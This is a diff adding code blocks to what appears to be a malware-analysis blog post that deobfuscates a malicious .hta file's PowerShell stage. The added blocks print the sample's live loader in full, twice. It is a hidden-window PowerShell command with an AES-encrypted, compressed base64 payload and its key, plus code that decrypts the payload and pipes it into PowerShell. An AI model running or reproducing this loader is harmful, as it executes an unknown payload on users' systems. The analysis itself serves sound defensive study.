@@ -84,6 +84,16 @@ objFile.Write res & vCrLf objFile.Close
 
 Now we can simply double click the .hta file, and let Windows execute it with mshta, as expected, and the .hta file will no longer execute the malicious code, but dump it to disk.
 
+`Powershell encoded command`
+<details>
+	<summary>Click to expand</summary>
+    <pre>
+    
+    soM = "powershell.exe -ExecutionPolicy UnRestricted Start-Process 'cmd.exe' -WindowStyle hidden -ArgumentList {/c powershell.exe $pZkRiaJD = 'AAAAAAAAAAAAAAAAAAAAAMZbnmKI5yJzY0/WQWx9pERm/fSCckH8ILzvReUF1wcACGP6Y48ADm5jSZVnqmbGIojj2Dmku8TuxQRAy6fb7KcNVkUMIqi47Hr98me/iW4N0eU1TrRcePokXLAVIdpd0YsHsTrDaCnopHF6yaMX38QoTo+9lL+0uD4xYCrBE/mCaSbflnBwE/2SaKno8Z2HWsokTNqL4vYJKCzrtDwHnmjB9gHhUHJfVzjc7ebkT6C3SAq2Z0XTjHevOqOpPHOHGW9cneSTFEDfJ6doPSnIf+SP72SDIqL3iIYUnvflVjUO/UGUOEStfLnjnHFHDPJW0rYXsQOnLmw9ZYUsaMohy2yBc+TwDsVPJ8s1pN2PKbjNzMNc0UpzKBHXOAX9C7RE/FQpoIaHfszGznEVY9+zfPnY3cr527rFF2ceRFyQqlUkwgb1uu4Y++8XHP2ZzPtBpVigVOMGq4e0oP263S/FJMqXk9VTZUcWrS8QGVHudqbfKmPc/8Rr9q3fcF+UT9iN/aq0uSFV6Fmwlibo1oqL7ff7CiIobLL9vw07wqBUAMsspuSBLMqE/aSlhObYJTy+PZmUPdiOvG1Gw45TBzw0hZPc09xncRQNlXcgRDnXgFwFH99qR/E6uM5zRPnyQ9hC/TmJAAnCyCtZS3L6W3Q3+a+8X4SRjLhU9QJqdHlKZ0u0FFBkFih6Qi+9x4lGbKnMKilDV4H7dq7aJqGbC6euzA4iRhaK1uYA50wtAHHOQpwJ0y6qCOSMAu5DLsne/RJziX508xPIEHaA/Ou/xvxhSj7+bmwFWpgO0JR5LGK/bHxzUTcxXz38X1Q+UaXrkuiKiJPsrRJJ7od5QSV+A3u5avOyVhxSLGU9GIT/+9c3B+wm3aYKWIpSIcYB61hjvNbw2j0YCu6w9+xKDN0DHG3icpa1UwoU4yMts2HLRuuhZuE1RmVd26po7q4JD/WqzfRDpIEza3s+anOh+YOvyEqEhW66rleWT7GknMN/Bd51qp6PAZ2hXXw4K+DRsfjQZnzziTeawucTGjluMDOB7+I3gI0fZf5vXoadVGPhikxlQTO8mGkKGewGy8vzZD2E5Ki6LydjfQqhK48SlS51GGr4g+fa7N0Lq0SQYAp/q88OJnSLJ/pK1ZrF4sayO1n4kbndNKPkpUQK5Ets0Nt7mawIa5UwuhI5ZiII/z5hGhjU5qSOmOSn5aLoZeFveu0MkM/pZh4mVRv0oCR32R0yYc3QodOZwaAKwewgolHI4uLy0ht26x98B+ihL8MeyN1QTYeeOlrMx7P/MdSq+4XiokwfEzp7fL5VLwaHLFLx984qbzbm9gjp/u/Zx3+Pf/0futvpuWCWyTv42fuEd8QoDKqNSXu73Jy3NC4Ia2cGugGx0el/CI0OPvq70Wdv+3VpPAQdP9b2KizsaxAM+A5uRSJlO/e4K3tqQZUWCFTczzuWAtegzUqKPvyMyuzdll0nNFpz1MR/fXiGzXVsr3B8yPSmL3YtAgZ2NY6Ctbp5BRIavLC29criOhsJkykI7inzz0axHGOs3QFb9bJ+dawJhffqKgceUtr23m4v8XN/j6xw1aQ4Rk8NKD2OpGbwrl5668xhUEc81Q2u0YHpq2LS4orR6ctpkZF7V6yCa7g8Efd3PS1ViU6uqfBQu3hHsp9hOJtwKskB80pH/Ah6zVQEcPbIHPzp4js25GbE/mEAn3N1KGYjHmwuCPK0Iyamf3+j3pe9e3td6X1auA5+UekEpNPTVr7yGY8CvYfz6FUJGr/68B/ocAfBVSDfEeErUHBJ3uCbDWlKYzriTeTdkydB3y0lHwiJbFEM1tFr5fnkPl15q/mfT8TXn5eBiurMqwSVCCApx+Obj3NiNkMeI+T+4saS0PCfrZxqO+8iRCnNSCmm3Fo2cJV2oM3+t93FwZOVmilXwfdhF2fXxjqHL0oxNuY8DzFc5Zy2oWDTAcJ+xVBUXbL7a293ZnD8K4ogS5J2HdqXBconrU6ULd9RNL8P4T1ZYjxghMdK+0iOYLp1nq7YjdrbjV7BdwJ/kOPmYFVNwAG1tqv3DfZ2/UEIyooz6igHqEPiSs5BGKXONpljVqi/tCcxskkuMXXL/Q4w2SaxaxDtjh/vodPPoTNj0hiMSxFF53kS3USGnQnEVKWYqfnDQ9U75kdr4OSrMMcJTTRTe2Div9LM/NjNjL+82lJCBfsKIwXQ/DNTepdPIFvV3/aBdV+uCW7NbZU71ngHhh2Bhs0Z138vKDJbesipF1Jem1A0k4SHOyiGue4SypYbFuX56ugJkz4Qzh+dmMpxPGJDtD6kgkAmWvEnzejfGdKigKRJzNssvfHbg+YMTPd9/Qy3WRrCmwqbhE8fMrWza+BNVmNoC3o5NH4aK03IfEFT9fELPUsQBjlznTU7cPYGwhv4FFUX3egfD2thyMUXGDc5ZGzkF/dN/m4H5t9Qu17A8hFUIOa+dRI7vjCiCekiexD/6BLb5IDp1z+3QDO9dhQPeYEjSbAX4b0eyVoUjvmamkc5jrHjgo7w9ktOLBMXYs1tDAAuIWU7sTdk3TVGhkxjlWm9f2X/852CfhJ6+gT5OhMVz7Yd3oS+GiD/mazWYKo4eI9LQMX/xHHjEB7GBq9LC4tkJfT7qSakTtQQTlRzlyYovSLrejbTj5BsL+kr89WPzKnJBrVntaoVxuRHrmH1Fv2kjOso4Oz4u+W0T2SOyrxWK+/+p9xGmEDJ274Th10nwtuTYEj6kggk/8RXmG9AYLJSvyy/cV0RZrbRZWigAgcek1rghcLUFA02OTwcGG2v9Yw70Pb6/+Qr04RbA5wcUpnVR22brODZng/77TjETyRDlQNyKwyyX7/us2f7R6mK5qCWjNOO+waPH0X4EJZOsJQPb2PLCZxj9AF3Lwj/VESC1fsQNYjSnYT/TkaYU0/F61v35Ll59eSU6Ke/2mvZXvtqn8xzvWO1S0nuwIQUIeuJxuzGSLS5TAfzWCNK6xMorRS9oIS4D2qEb2gLRtQ65GDsHbHiX/AlX3QiyIIcPzU4zysbVMWvJ8vxfMj+OkcaNuxo7Ox+cXmkJxN7VhjS1rJjq991VNWolaaGlaigqcpbpE7fG250Itlu4gb/plWM+dRahMc+zbz3Xq2s0j7c6r6jdOPGH8t9NSghM6baxf/pyZwqdrlT3bhI6B/ImjBlQNuqhX+kBrVDnk1Dz8tcJKf+uLnsW7pMndsu0ajFi9dRe7v92diRAFdCe5t2Ss0crnaP1UFX98f0j1Pxgfe3Nn504b5jWLP4ptVmPiuaaNo4xg8jfBS6yRYyeT0J3879aI5wa+nd9YFEkzbEtXWgCrWLf+9+ge8wNBt4cdX4jztBnsMpytRr2bUq7E1GOLrAbD1QNEKJbmu1nw7q0lqhwOzyb0R8YaEO6Gf662eCOFBZkuPOlrCtIRSH4i9fHxrUTIDl0GE7viyqT7tWGOAX3TRuqacU8GrfbbwAxix7PL7ARL3Ju+nqkTgRtcSejzdSV3lClfRBAM/NEdBEBHaU+oSgEv6vRDgKP7hngRZn/AGGZzQUwxPUAE+lAXAMjSi+J8XPYMI9/VWKyw87Qkd58qMXaq49wEo6AUm95qBJAHji9tdftcPV17J5LEqvQamMLAba+A8yu4HXerMGf2rhPe2a5V4ai+kw/qobTmnXFJ+el1geUgec8pHZ+3gLW4TVpV/1jhkAh1IqMHMdmZnXtAzdBHOn9vUN2vAOQsYCIjYt15cu217LPRMD1z/hMCP7W5Mt6DBqXb/HQxvml/6uFf+aovYs0HLpylVKHVUkzJdQHLEO7g+Exxg2XDpqZaRKt42SRw/ZXpxba036r2M+lz1AH5FYfXDD/Yle/hkTRtixoYq0MS2UV9ocxtSKUqDZ2t8yDdMiUzxDJOK4ZBJTSV6pO/DgH000t4OjZ9oOshv30bTQevnyHyvzDgj1GSED6/6sYveKbrdScZSR1Ce5f88XyC2xA0IdgOEYtHaUEEUYVtV1N5pm3hjurP9PJgE2/HPeCtOJ5UuVeiHtFaZZkcE3+1GaDrLnW9RuuPja0ocR6POX8jNRVcr0TclV/GpFRslLAv/+ONuoBzKxn/3PwiWg7BUrmx1eK/zXgoaaNWdMqydiS7qnPvvV4FkCrgu3GRWF';$qWbMznzH = 'YUN2QllYR0Z6aHdIZ2FldWJ1RkZEdXhLcUxYQWVja3c=';$fZhgSgXh = New-Object 'System.Security.Cryptography.AesManaged';$fZhgSgXh.Mode = [System.Security.Cryptography.CipherMode]::ECB;$fZhgSgXh.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$fZhgSgXh.BlockSize = 128;$fZhgSgXh.KeySize = 256;$fZhgSgXh.Key = [System.Convert]::FromBase64String($qWbMznzH);$NTgie = [System.Convert]::FromBase64String($pZkRiaJD);$iVtnQAzt = $NTgie[0..15];$fZhgSgXh.IV = $iVtnQAzt;$URkhGcvDV = $fZhgSgXh.CreateDecryptor();$zixRPvNOX = $URkhGcvDV.TransformFinalBlock($NTgie, 16, $NTgie.Length - 16);$fZhgSgXh.Dispose();$MgWn = New-Object System.IO.MemoryStream( , $zixRPvNOX );$qWishCR = New-Object System.IO.MemoryStream;$iuyBLJBDj = New-Object System.IO.Compression.GzipStream $MgWn, ([IO.Compression.CompressionMode]::Decompress);$iuyBLJBDj.CopyTo( $qWishCR );$iuyBLJBDj.Close();$MgWn.Close();[byte[]] $ACedLT = $qWishCR.ToArray();$yaPSZfZ = [System.Text.Encoding]::UTF8.GetString($ACedLT);$yaPSZfZ | powershell - }"
+
+    </pre>
+</details>
+
 
 [![7-31-23_8.png](/assets/images/7-31-23/7-31-23_8.png)](/assets/images/7-31-23/7-31-23_8.png)
 
@@ -95,6 +105,40 @@ The 'cTE' function is to create char codes for line 20, which converts to 'wscri
 The rest of this code looks useless!
 
 To decode the powershell, I will stick it in vscode and reformat it(replacing the semicolons with new lines), then stick it into ise.
+
+`Powershell`
+<details>
+	<summary>Click to expand</summary>
+    <pre>
+
+
+    $pZkRiaJD = 'AAAAAAAAAAAAAAAAAAAAAMZbnmKI5yJzY0/WQWx9pERm/fSCckH8ILzvReUF1wcACGP6Y48ADm5jSZVnqmbGIojj2Dmku8TuxQRAy6fb7KcNVkUMIqi47Hr98me/iW4N0eU1TrRcePokXLAVIdpd0YsHsTrDaCnopHF6yaMX38QoTo+9lL+0uD4xYCrBE/mCaSbflnBwE/2SaKno8Z2HWsokTNqL4vYJKCzrtDwHnmjB9gHhUHJfVzjc7ebkT6C3SAq2Z0XTjHevOqOpPHOHGW9cneSTFEDfJ6doPSnIf+SP72SDIqL3iIYUnvflVjUO/UGUOEStfLnjnHFHDPJW0rYXsQOnLmw9ZYUsaMohy2yBc+TwDsVPJ8s1pN2PKbjNzMNc0UpzKBHXOAX9C7RE/FQpoIaHfszGznEVY9+zfPnY3cr527rFF2ceRFyQqlUkwgb1uu4Y++8XHP2ZzPtBpVigVOMGq4e0oP263S/FJMqXk9VTZUcWrS8QGVHudqbfKmPc/8Rr9q3fcF+UT9iN/aq0uSFV6Fmwlibo1oqL7ff7CiIobLL9vw07wqBUAMsspuSBLMqE/aSlhObYJTy+PZmUPdiOvG1Gw45TBzw0hZPc09xncRQNlXcgRDnXgFwFH99qR/E6uM5zRPnyQ9hC/TmJAAnCyCtZS3L6W3Q3+a+8X4SRjLhU9QJqdHlKZ0u0FFBkFih6Qi+9x4lGbKnMKilDV4H7dq7aJqGbC6euzA4iRhaK1uYA50wtAHHOQpwJ0y6qCOSMAu5DLsne/RJziX508xPIEHaA/Ou/xvxhSj7+bmwFWpgO0JR5LGK/bHxzUTcxXz38X1Q+UaXrkuiKiJPsrRJJ7od5QSV+A3u5avOyVhxSLGU9GIT/+9c3B+wm3aYKWIpSIcYB61hjvNbw2j0YCu6w9+xKDN0DHG3icpa1UwoU4yMts2HLRuuhZuE1RmVd26po7q4JD/WqzfRDpIEza3s+anOh+YOvyEqEhW66rleWT7GknMN/Bd51qp6PAZ2hXXw4K+DRsfjQZnzziTeawucTGjluMDOB7+I3gI0fZf5vXoadVGPhikxlQTO8mGkKGewGy8vzZD2E5Ki6LydjfQqhK48SlS51GGr4g+fa7N0Lq0SQYAp/q88OJnSLJ/pK1ZrF4sayO1n4kbndNKPkpUQK5Ets0Nt7mawIa5UwuhI5ZiII/z5hGhjU5qSOmOSn5aLoZeFveu0MkM/pZh4mVRv0oCR32R0yYc3QodOZwaAKwewgolHI4uLy0ht26x98B+ihL8MeyN1QTYeeOlrMx7P/MdSq+4XiokwfEzp7fL5VLwaHLFLx984qbzbm9gjp/u/Zx3+Pf/0futvpuWCWyTv42fuEd8QoDKqNSXu73Jy3NC4Ia2cGugGx0el/CI0OPvq70Wdv+3VpPAQdP9b2KizsaxAM+A5uRSJlO/e4K3tqQZUWCFTczzuWAtegzUqKPvyMyuzdll0nNFpz1MR/fXiGzXVsr3B8yPSmL3YtAgZ2NY6Ctbp5BRIavLC29criOhsJkykI7inzz0axHGOs3QFb9bJ+dawJhffqKgceUtr23m4v8XN/j6xw1aQ4Rk8NKD2OpGbwrl5668xhUEc81Q2u0YHpq2LS4orR6ctpkZF7V6yCa7g8Efd3PS1ViU6uqfBQu3hHsp9hOJtwKskB80pH/Ah6zVQEcPbIHPzp4js25GbE/mEAn3N1KGYjHmwuCPK0Iyamf3+j3pe9e3td6X1auA5+UekEpNPTVr7yGY8CvYfz6FUJGr/68B/ocAfBVSDfEeErUHBJ3uCbDWlKYzriTeTdkydB3y0lHwiJbFEM1tFr5fnkPl15q/mfT8TXn5eBiurMqwSVCCApx+Obj3NiNkMeI+T+4saS0PCfrZxqO+8iRCnNSCmm3Fo2cJV2oM3+t93FwZOVmilXwfdhF2fXxjqHL0oxNuY8DzFc5Zy2oWDTAcJ+xVBUXbL7a293ZnD8K4ogS5J2HdqXBconrU6ULd9RNL8P4T1ZYjxghMdK+0iOYLp1nq7YjdrbjV7BdwJ/kOPmYFVNwAG1tqv3DfZ2/UEIyooz6igHqEPiSs5BGKXONpljVqi/tCcxskkuMXXL/Q4w2SaxaxDtjh/vodPPoTNj0hiMSxFF53kS3USGnQnEVKWYqfnDQ9U75kdr4OSrMMcJTTRTe2Div9LM/NjNjL+82lJCBfsKIwXQ/DNTepdPIFvV3/aBdV+uCW7NbZU71ngHhh2Bhs0Z138vKDJbesipF1Jem1A0k4SHOyiGue4SypYbFuX56ugJkz4Qzh+dmMpxPGJDtD6kgkAmWvEnzejfGdKigKRJzNssvfHbg+YMTPd9/Qy3WRrCmwqbhE8fMrWza+BNVmNoC3o5NH4aK03IfEFT9fELPUsQBjlznTU7cPYGwhv4FFUX3egfD2thyMUXGDc5ZGzkF/dN/m4H5t9Qu17A8hFUIOa+dRI7vjCiCekiexD/6BLb5IDp1z+3QDO9dhQPeYEjSbAX4b0eyVoUjvmamkc5jrHjgo7w9ktOLBMXYs1tDAAuIWU7sTdk3TVGhkxjlWm9f2X/852CfhJ6+gT5OhMVz7Yd3oS+GiD/mazWYKo4eI9LQMX/xHHjEB7GBq9LC4tkJfT7qSakTtQQTlRzlyYovSLrejbTj5BsL+kr89WPzKnJBrVntaoVxuRHrmH1Fv2kjOso4Oz4u+W0T2SOyrxWK+/+p9xGmEDJ274Th10nwtuTYEj6kggk/8RXmG9AYLJSvyy/cV0RZrbRZWigAgcek1rghcLUFA02OTwcGG2v9Yw70Pb6/+Qr04RbA5wcUpnVR22brODZng/77TjETyRDlQNyKwyyX7/us2f7R6mK5qCWjNOO+waPH0X4EJZOsJQPb2PLCZxj9AF3Lwj/VESC1fsQNYjSnYT/TkaYU0/F61v35Ll59eSU6Ke/2mvZXvtqn8xzvWO1S0nuwIQUIeuJxuzGSLS5TAfzWCNK6xMorRS9oIS4D2qEb2gLRtQ65GDsHbHiX/AlX3QiyIIcPzU4zysbVMWvJ8vxfMj+OkcaNuxo7Ox+cXmkJxN7VhjS1rJjq991VNWolaaGlaigqcpbpE7fG250Itlu4gb/plWM+dRahMc+zbz3Xq2s0j7c6r6jdOPGH8t9NSghM6baxf/pyZwqdrlT3bhI6B/ImjBlQNuqhX+kBrVDnk1Dz8tcJKf+uLnsW7pMndsu0ajFi9dRe7v92diRAFdCe5t2Ss0crnaP1UFX98f0j1Pxgfe3Nn504b5jWLP4ptVmPiuaaNo4xg8jfBS6yRYyeT0J3879aI5wa+nd9YFEkzbEtXWgCrWLf+9+ge8wNBt4cdX4jztBnsMpytRr2bUq7E1GOLrAbD1QNEKJbmu1nw7q0lqhwOzyb0R8YaEO6Gf662eCOFBZkuPOlrCtIRSH4i9fHxrUTIDl0GE7viyqT7tWGOAX3TRuqacU8GrfbbwAxix7PL7ARL3Ju+nqkTgRtcSejzdSV3lClfRBAM/NEdBEBHaU+oSgEv6vRDgKP7hngRZn/AGGZzQUwxPUAE+lAXAMjSi+J8XPYMI9/VWKyw87Qkd58qMXaq49wEo6AUm95qBJAHji9tdftcPV17J5LEqvQamMLAba+A8yu4HXerMGf2rhPe2a5V4ai+kw/qobTmnXFJ+el1geUgec8pHZ+3gLW4TVpV/1jhkAh1IqMHMdmZnXtAzdBHOn9vUN2vAOQsYCIjYt15cu217LPRMD1z/hMCP7W5Mt6DBqXb/HQxvml/6uFf+aovYs0HLpylVKHVUkzJdQHLEO7g+Exxg2XDpqZaRKt42SRw/ZXpxba036r2M+lz1AH5FYfXDD/Yle/hkTRtixoYq0MS2UV9ocxtSKUqDZ2t8yDdMiUzxDJOK4ZBJTSV6pO/DgH000t4OjZ9oOshv30bTQevnyHyvzDgj1GSED6/6sYveKbrdScZSR1Ce5f88XyC2xA0IdgOEYtHaUEEUYVtV1N5pm3hjurP9PJgE2/HPeCtOJ5UuVeiHtFaZZkcE3+1GaDrLnW9RuuPja0ocR6POX8jNRVcr0TclV/GpFRslLAv/+ONuoBzKxn/3PwiWg7BUrmx1eK/zXgoaaNWdMqydiS7qnPvvV4FkCrgu3GRWF'
+
+    $qWbMznzH = 'YUN2QllYR0Z6aHdIZ2FldWJ1RkZEdXhLcUxYQWVja3c='
+    $fZhgSgXh = New-Object 'System.Security.Cryptography.AesManaged'
+    $fZhgSgXh.Mode = [System.Security.Cryptography.CipherMode]::ECB
+    $fZhgSgXh.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $fZhgSgXh.BlockSize = 128
+    $fZhgSgXh.KeySize = 256
+    $fZhgSgXh.Key = [System.Convert]::FromBase64String($qWbMznzH)
+    $NTgie = [System.Convert]::FromBase64String($pZkRiaJD)
+    $iVtnQAzt = $NTgie[0..15]
+    $fZhgSgXh.IV = $iVtnQAzt
+    $URkhGcvDV = $fZhgSgXh.CreateDecryptor()
+    $zixRPvNOX = $URkhGcvDV.TransformFinalBlock($NTgie, 16, $NTgie.Length - 16)
+    $fZhgSgXh.Dispose()
+    $MgWn = New-Object System.IO.MemoryStream( , $zixRPvNOX )
+    $qWishCR = New-Object System.IO.MemoryStream
+    $iuyBLJBDj = New-Object System.IO.Compression.GzipStream $MgWn, ([IO.Compression.CompressionMode]::Decompress)
+    $iuyBLJBDj.CopyTo( $qWishCR )
+    $iuyBLJBDj.Close()
+    $MgWn.Close()
+    [byte[]] $ACedLT = $qWishCR.ToArray()
+    $yaPSZfZ = [System.Text.Encoding]::UTF8.GetString($ACedLT)
+    $yaPSZfZ | powershell -
+
+    </pre>
+</details>
 
 The first line is a large base64, encrypted, compressed blob.
 The rest of the code looks like this
